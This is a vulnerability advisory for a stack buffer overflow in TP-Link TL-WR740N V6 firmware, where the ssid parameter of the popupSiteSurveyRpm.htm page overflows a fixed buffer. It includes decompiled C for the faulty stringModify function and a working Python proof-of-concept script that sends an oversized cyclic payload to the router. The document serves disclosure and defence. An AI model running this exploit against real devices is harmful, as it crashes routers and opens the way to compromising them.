## Overview

- Firmware download website: https://www.tp-link.com/no/support/download/tl-wr740n/#Firmware

## Affected version

TL-WR740N V6

## Vulnerability details

In the TL-WR740N V6 Firmware has a stack overflow vulnerability in the `/userRpm/popupSiteSurveyRpm.htm` url. The `v21` variable receives the `ssid` parameter from a POST request and is later assigned to the `v53` variable, which is fixed at 17 bytes. 

![image-20240828174236232](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174236232.png)

![image-20240828174451292](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174451292.png)

![image-20240828174610096](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174610096.png)

![image-20240828174647853](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174647853.png)

![image-20240828174718594](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174718594.png)

However, since the user can control the input of `ssid`, the statement `stringModify(v8, 512, a3)` can cause a buffer overflow. The user-provided `ssid` can exceed the capacity of the `v8` array, triggering this security vulnerability.

```c
int __fastcall stringModify(_BYTE *a1, int a2, int a3)
{
  bool v3; // dc
  char *v4; // $a2
  int v5; // $a3
  int v6; // $v0
  int v7; // $v1

  if ( !a1 )
    return -1;
  v3 = a3 == 0;
  v4 = (char *)(a3 + 1);
  if ( v3 )
    return -1;
  v5 = 0;
  while ( 1 )
  {
    v7 = *(v4 - 1);
    if ( !*(v4 - 1) || v5 >= a2 )
      break;
    if ( v7 == 47 )
      goto LABEL_18;
    if ( v7 >= 48 )
    {
      if ( v7 == 62 || v7 == 92 )
      {
LABEL_18:
        *a1 = 92;
LABEL_19:
        ++v5;
        ++a1;
      }
      else if ( v7 == 60 )
      {
        *a1 = 92;
        goto LABEL_19;
      }
LABEL_20:
      ++v5;
      *a1++ = *(v4 - 1);
      goto LABEL_21;
    }
    if ( v7 != 13 )
    {
      if ( v7 == 34 )
        goto LABEL_18;
      if ( v7 != 10 )
        goto LABEL_20;
    }
    v6 = *v4;
    if ( v6 != 13 && v6 != 10 )
    {
      *a1 = 60;
      a1[1] = 98;
      a1[2] = 114;
      a1[3] = 62;
      a1 += 4;
    }
    ++v5;
LABEL_21:
    ++v4;
  }
  *a1 = 0;
  return v5;
}
```

## PoC

```python
import requests
import urllib
session = requests.Session()
session.verify = False
def exp(path,cookie):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Cookie":"Authorization=Basic{cookie}".format(cookie=str(cookie))
        }
    payload="/%0A"*0x55 + "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac"
    params = {
    "mode":"1000",
    "curRegion":"1000",
    "chanWidth":"100",
    "channel":"1000",
    "ssid":urllib.request.unquote(payload)
    }
    url="http://192.168.0.1:80/{path}/userRpm/popupSiteSurveyRpm.htm".format(path=str(path))
    resp = session.get(url,params=params,headers=headers)
    print (resp.text)
exp("AMSHQZKAISQSDUOA","%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D")
```

![image-20240828173712920](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828173712920.png)
